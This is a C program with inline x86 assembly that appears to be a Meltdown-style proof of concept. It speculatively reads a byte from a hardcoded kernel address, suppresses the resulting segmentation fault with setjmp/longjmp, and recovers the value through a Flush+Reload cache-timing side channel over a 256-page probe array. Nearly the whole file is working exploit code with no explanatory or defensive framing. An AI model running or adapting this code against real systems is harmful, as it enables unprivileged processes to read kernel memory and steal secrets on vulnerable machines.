#include <stdio.h>
#include <signal.h>
#include <x86intrin.h>
#include <setjmp.h>

#define PAGE_SIZE (4096)
#define CYCLES_CACHE_HIT 100

static jmp_buf context;

void segfault_handler() {
    // puts("received SIGSEGV");
    longjmp(context, 1);
}

int main() {

    unsigned char array[PAGE_SIZE*(256+1)];
    unsigned int cycles_start, cycles_end;
    unsigned long cycles, cycles_min = ~0;
    int i, i_min = -1;
    unsigned char dummy;

    // setup segfault handling
    struct sigaction segfault_act;
    segfault_act.sa_handler = segfault_handler;
    sigaction(SIGSEGV, &segfault_act, NULL);

    for(i=1; i<=256; i++)
        array[PAGE_SIZE*i] = i;

    // while(cycles_min > CYCLES_CACHE_HIT) {
    for(i=1; i<=256; i++)
        _mm_clflush(&array[PAGE_SIZE*i]);

    if(setjmp(context))
        goto end;

    // If we lose the race condition and %al is not loaded (or is even
    // zeroed by the CPU) array[0] will be accessed. Below, the checks for
    // cache misses start at array[PAGE_SIZE]. Therefore a cache hit for
    // array[0] will never be detected... This is good because no false
    // positives will exist due to losing the race condition. But it's bad
    // because if the content of the address is actually 0 we will not
    // detect that. FIXME
    asm volatile ("" : : "b"(array));
    asm volatile ("" : : "c"(0xffffffff932001a8));
    asm volatile ("xorq %rax, %rax");
    asm volatile ("movb (%rcx), %al");
    asm volatile ("shlq $0xc, %rax");
    asm volatile ("movq (%rbx,%rax), %rbx");

end:

    for(i=1; i<=256; i++) {
        // https://stackoverflow.com/a/14214220/2057521
        asm volatile (
                "cpuid\n\t"/*serialize*/
                "rdtsc\n\t"/*read the clock*/
                "mov %%eax, %0\n\t": "=r" (cycles_start)
                :: "%rax", "%rbx", "%rcx", "%rdx");

        dummy = array[PAGE_SIZE*i];

        asm volatile (
                "rdtscp\n\t"/*read the clock*/
                "mov %%eax, %0\n\t"
                "cpuid\n\t": "=r" (cycles_end)
                :: "%rax", "%rbx", "%rcx", "%rdx");

        cycles = cycles_end - cycles_start;

        // printf("cycles %3d: %lu\n", i, cycles);

        if(cycles <= cycles_min) {
            cycles_min = cycles;
            i_min = i;
        }
    }

    printf("min cycles %3d: %lu\n", i_min, cycles_min);

    return 0;
}
